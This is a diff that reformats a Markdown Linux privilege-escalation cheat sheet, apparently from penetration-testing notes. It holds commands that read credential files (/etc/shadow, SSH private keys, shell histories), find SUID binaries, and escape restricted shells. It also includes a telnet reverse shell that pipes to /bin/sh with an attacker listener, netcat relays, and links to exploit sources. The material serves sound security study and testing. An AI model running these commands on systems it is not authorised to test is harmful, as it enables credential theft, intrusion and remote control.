@@ -48,32 +48,32 @@ which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/de
 
 ### Find UID 0 files \(root execution\)
 
-```text
+```bash
 /usr/bin/find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\\\; 2>/dev/null
 ```
 
 ### Find executable files updated in August
 
-```text
+```bash
 find / -executable -type f 2> /dev/null | egrep -v "^/bin|^/var|^/etc|^/usr" | xargs ls -lh | grep Aug
 ```
 
 ### Find a specific file
 
-```text
+```bash
 find /. -name suid\\\*\\
 ```
 
 ### Display all the strings in a file
 
 ```text
-strings <filename>
+strings $file
 ```
 
 ### Determine the type of a file
 
 ```text
-file <filename>
+file $file
 ```
 
 ## Process Enumeration
@@ -127,10 +127,10 @@ Download **and** execute script \(such as LinEnum.sh\) \[from remote host\]: `cu
 Locate exploits:
 
 ```bash
-searchsploit <name_of_program> 
+searchsploit $keyword 
 
 #to pull exploit code:
-searchsploit -x <name/number of exploit>
+searchsploit -x $exploit_num
 ```
 
 enumeration multi-tool: [Sparta](https://sparta.secforce.com/) \(does nmap, hydra, nikto, sqlscan, ssl...\)
@@ -139,33 +139,45 @@ Semi-automated enumeration all-in-one \(use this!\): [nmapAutomator](https://git
 
 Unix hardening tool that can be used for enumeration: [Bastille](http://bastille-linux.sourceforge.net/)
 
-```text
-Enumeration is the key.
-(Linux) privilege escalation is all about:
-Collect - Enumeration, more enumeration and some more enumeration.
-Process - Sort through data, analyse and prioritisation.
-Search - Know what to search for and where to find the exploit code.
-Adapt - Customize the exploit, so it fits. Not every exploit work for every system "out of the box".
-Try - Get ready for (lots of) trial and error.
+## Procedures
 
-Operating System
+Enumeration is the key. Linux privilege escalation is all about:
+
+* Collect - Enumeration, more enumeration and some more enumeration.
+* Process - Sort through data, analyse and prioritisation.
+* Search - Know what to search for and where to find the exploit code.
+* Adapt - Customize the exploit, so it fits. Not every exploit work for every system "out of the box".
+* Try - Get ready for \(lots of\) trial and error.
+
+### Questions to ask:
+
+TODO: Split debian/redhat/BSD commands up into tabs; Clean up code for scripting \($var, etc\)
+
+#### Operating System
+
 What's the distribution type? What version?
+
+```bash
 cat /etc/issue
 cat /etc/*-release
-   cat /etc/lsb-release
-   cat /etc/redhat-release
+cat /etc/lsb-release
+cat /etc/redhat-release
+```
 
+What's the Kernel version? Is it 32 or 64-bit?
 
-What's the Kernel version? Is it 64-bit?
+```bash
 cat /proc/version   
 uname -a
 uname -mrs 
 rpm -q kernel 
 dmesg | grep Linux
 ls /boot | grep vmlinuz-
-
+```
 
 What can be learnt from the environmental variables?
+
+```text
 cat /etc/profile
 cat /etc/bashrc
 cat ~/.bash_profile
@@ -173,35 +185,47 @@ cat ~/.bashrc
 cat ~/.bash_logout
 env
 set
-
+```
 
 Is there a printer?
+
+```text
+
 lpstat -a
+```
 
+#### Applications & Services
 
-Applications & Services
 What services are running? Which service has which user privilege?
+
+```text
 ps aux
 ps -ef
 top
-cat /etc/service 
+cat /etc/service
+```
 
+Which service\(s\) are been running by root? Of these services, which are vulnerable - it's worth a double check!
 
-Which service(s) are been running by root? Of these services, which are vulnerable - it's worth a double check!
+```text
 ps aux | grep root
 ps -ef | grep root
-
+```
 
 What applications are installed? What version are they? Are they currently running?
+
+```text
 ls -alh /usr/bin/
 ls -alh /sbin/
 dpkg -l
 rpm -qa
 ls -alh /var/cache/apt/archivesO
 ls -alh /var/cache/yum/ 
+```
 
+Any of the service\(s\) settings misconfigured? Are any \(vulnerable\) plugins attached?
 
-Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached?
+```text
 cat /etc/syslog.conf 
 cat /etc/chttp.conf
 cat /etc/lighttpd.conf
@@ -212,9 +236,11 @@ cat /etc/my.conf
 cat /etc/httpd/conf/httpd.conf
 cat /opt/lampp/etc/httpd.conf
 ls -aRl /etc/ | awk '$1 ~ /^.*r.*/ 
-
+```
 
 What jobs are scheduled?
+
+```text
 crontab -l
 ls -alh /var/spool/cron
 ls -al /etc/ | grep cron
@@ -227,31 +253,41 @@ cat /etc/cron.deny
 cat /etc/crontab
 cat /etc/anacrontab
 cat /var/spool/cron/crontabs/root
+```
 
 Any plain text usernames and/or passwords?
+
+```text
 grep -i user [filename]
 grep -i pass [filename]
 grep -C 5 "password" [filename]
 find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla 
+```
 
+#### Communications & Networking
 
-Communications & Networking
-What NIC(s) does the system have? Is it connected to another network?
+What NIC\(s\) does the system have? Is it connected to another network?
+
+```text
 /sbin/ifconfig -a
 cat /etc/network/interfaces
-cat /etc/sysconfig/network 
-
+cat /etc/sysconfig/network
+```
 
 What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?
+
+```text
 cat /etc/resolv.conf
 cat /etc/sysconfig/network
 cat /etc/networks
 iptables -L
 hostname
 dnsdomainname
-
+```
 
 What other users & hosts are communicating with the system?
+
+```text
 lsof -i 
 lsof -i :80
 grep 80 /etc/services
@@ -262,51 +298,73 @@ chkconfig --list
 chkconfig --list | grep 3:on
 last
 w
+```
 
+What's cached? IP and/or MAC addresses
 
-Whats cached? IP and/or MAC addresses
+```text
 arp -e
 route
 /sbin/route -nee
-
+```
 
 Is packet sniffing possible? What can be seen? Listen to live traffic
+
+```text
 # tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
 tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21
-
+```
 
 Have you got a shell? Can you interact with the system?
-# http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
+
+* [http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/](http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/)
+
+```text
 nc -lvp 4444    # Attacker. Input (Commands)
 nc -lvp 4445    # Attacker. Ouput (Results)
 telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!
 
+```
 
 Is port forwarding possible? Redirect and interact with traffic from another view
-# rinetd
-# http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch
 
-# fpipe
+* rinetd - [http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch](http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch)
+* fpipe
+
+```text
 # FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]
 FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
+```
 
+* SSH
+
+```text
 # ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
 ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
 ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
+```
 
+* mknod backpipe
+
+```text
 # mknod backpipe p ; nc -l -p [remote port] < backpipe  | nc [local IP] [local port] >backpipe
 mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe    # Port Relay
 mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
 mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)
+```
 
+Is tunneling possible? Send commands from local machine to remote
 
-Is tunnelling possible? Send commands locally, remotely
-ssh -D 127.0.0.1:9050 -N [username]@[ip] 
+```text
+ssh -D 127.0.0.1:9050 -N $username@$ip 
 proxychains ifconfig
+```
 
+#### Confidential Information & Users
 
-Confidential Information & Users
 Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?
+
+```bash
 id
 who
 w
@@ -316,42 +374,64 @@ grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super us
 awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
 cat /etc/sudoers
 sudo -l 
+```
 
+What sensitive files can be read? 
 
-What sensitive files can be found? 
+```text
 cat /etc/passwd
 cat /etc/group
 cat /etc/shadow
 ls -alh /var/mail/
+```
 
+Anything "interesting" in the home directorie\(s\)? If it's possible to access
 
-Anything "interesting" in the home directorie(s)? If it's possible to access
+```text
 ls -ahlR /root/
 ls -ahlR /home/
-
+```
 
 Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords
+
+```text
 cat /var/apache2/config.inc
 cat /var/lib/mysql/mysql/user.MYD 
 cat /root/anaconda-ks.cfg
+```
 
+What has the user been doing? Are there any passwords in plain text? What have they been editing?
 
-What has the user being doing? Is there any password in plain text? What have they been edting?
+```bash
+ls -la ~
 cat ~/.bash_history
+#check for other shells as well (zsh, etc.)
+
 cat ~/.nano_history
+#check for other exitors as well (vim, etc.)
+
 cat ~/.atftp_history
 cat ~/.mysql_history 
 cat ~/.php_history
-
+```
 
 What user information can be found? 
+
+```bash
 cat ~/.bashrc
+# check for other shells as well (zsh, etc.)
+
 cat ~/.profile
 cat /var/mail/root
 cat /var/spool/mail/root
-
+```
 
 Can private-key information be found? 
+
+```text
+ls -la ~/.ssh
+ls -la /etc/ssh
+
 cat ~/.ssh/authorized_keys
 cat ~/.ssh/identity.pub
 cat ~/.ssh/identity
@@ -367,10 +447,13 @@ cat /etc/ssh/ssh_host_rsa_key.pub
 cat /etc/ssh/ssh_host_rsa_key
 cat /etc/ssh/ssh_host_key.pub
 cat /etc/ssh/ssh_host_key
+```
 
+#### File Systems
 
-File Systems
-Which configuration files can be written in /etc/? Able to reconfigure a service?
+Which configuration files can be written in `/etc`? Are you able to reconfigure services?
+
+```bash
 ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
 ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null        # Owner
 ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
@@ -378,9 +461,11 @@ ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null          # Other
 
 find /etc/ -readable -type f 2>/dev/null                         # Anyone
 find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone 
+```
 
+What can be found in `/var` ? 
 
-What can be found in /var/ ? 
+```text
 ls -alh /var/log
 ls -alh /var/mail
 ls -alh /var/spool
@@ -388,18 +473,23 @@ ls -alh /var/spool/lpd
 ls -alh /var/lib/pgsql
 ls -alh /var/lib/mysql
 cat /var/lib/dhcp3/dhclient.leases
+```
 
+Any settings/files  related to web server? Any settings file with database information?
 
-Any settings/files (hidden) on website? Any settings file with database information?
+```text
 ls -alhR /var/www/
 ls -alhR /srv/www/htdocs/ 
 ls -alhR /usr/local/www/apache22/data/
 ls -alhR /opt/lampp/htdocs/ 
 ls -alhR /var/www/html/
+```
 
+Is there anything in the log file\(s\) \(Could help with "Local File Includes"!\)
 
-Is there anything in the log file(s) (Could help with "Local File Includes"!)
-# http://www.thegeekstuff.com/2011/08/linux-var-log-files/
+* [http://www.thegeekstuff.com/2011/08/linux-var-log-files/](http://www.thegeekstuff.com/2011/08/linux-var-log-files/)
+
+```text
 cat /etc/httpd/logs/access_log
 cat /etc/httpd/logs/access.log
 cat /etc/httpd/logs/error_log
@@ -439,24 +529,32 @@ ls -alh /var/log/postgresql/
 ls -alh /var/log/proftpd/
 ls -alh /var/log/samba/
 # auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
+```
 
+If commands are limited, can you break out of the "jail" shell?
 
-If commands are limited, you break out of the "jail" shell?
+```text
 python -c 'import pty;pty.spawn("/bin/bash")'
 echo os.system('/bin/bash')
 /bin/sh -i
-
+```
 
 How are file-systems mounted? 
+
+```text
 mount
 df -h
-
+```
 
 Are there any unmounted file-systems?
+
+```text
 cat /etc/fstab
+```
 
+What "Advanced Linux File Permissions" are used? "Sticky bit", SUID, GUID
 
-What "Advanced Linux File Permissions" are used? Sticky bits, SUID & GUID
+```bash
 find / -perm -1000 -type d 2>/dev/null    # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here
 find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the  group, not the user who started it.
 find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the  owner, not the user who started it.
@@ -466,60 +564,64 @@ for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f
 
 # find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
 find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null 
-
+```
 
 Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm
-find / -writable -type d 2>/dev/null        # world-writeable folders
-find / -perm -222 -type d 2>/dev/null      # world-writeable folders
-find / -perm -o+w -type d 2>/dev/null    # world-writeable folders
 
+```bash
+find / -writable -type d 2>/dev/null     # world-writeable folders
+find / -perm -222 -type d 2>/dev/null    # world-writeable folders
+find / -perm -o+w -type d 2>/dev/null    # world-writeable folders
 find / -perm -o+x -type d 2>/dev/null    # world-executable folders
 
 find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null   # world-writeable & executable folders
-
+```
 
 Any "problem" files? Word-writeable, "nobody" files
+
+```bash
 find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
-find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
+find /dir -xdev \( -nouser -o -nogroup \) -print   # No-owner files
+```
 
+#### Preparation for Writing Exploit Code
 
-Preparation & Finding Exploit Code
 What development tools/languages are installed/supported?
+
+```text
 find / -name perl*
 find / -name python*
 find / -name gcc* 
 find / -name cc
+```
 
+How can files be transferred?
 
-How can files be uploaded?
+```text
 find / -name wget
+find / -name curl
 find / -name nc*
 find / -name netcat*
 find / -name tftp* 
 find / -name ftp 
+```
 
+Researching Vulnerabilities
+
+* http://www.cvedetails.com
+* http://packetstormsecurity.org/files/cve/\[CVE\]
+* http://cve.mitre.org/cgi-bin/cvename.cgi?name=\[CVE\]
+* http://www.vulnview.com/cve-details.php?cvename=\[CVE\]
 
 Finding exploit code
-http://www.exploit-db.com
-http://1337day.com
-http://www.securiteam.com
-http://www.securityfocus.com
-http://www.exploitsearch.net
-http://metasploit.com/modules/
-http://securityreason.com
-http://seclists.org/fulldisclosure/
-http://www.google.com 
 
-
-Finding more information regarding the exploit 
-http://www.cvedetails.com
-http://packetstormsecurity.org/files/cve/[CVE]
-http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]
-http://www.vulnview.com/cve-details.php?cvename=[CVE]
-
-
-(Quick) "Common" exploits. Warning. Pre-compiled binaries files. Use at your own risk
-http://tarantula.by.ru/localroot/
-http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/
-```
+* https://www.exploit-db.com
+* https://cvebase.com
+* https://1337day.com
+* https://www.securiteam.com
+* https://www.securityfocus.com
+* https://www.exploitsearch.net
+* https://metasploit.com/modules/
+* https://securityreason.com
+* https://seclists.org/fulldisclosure/
 
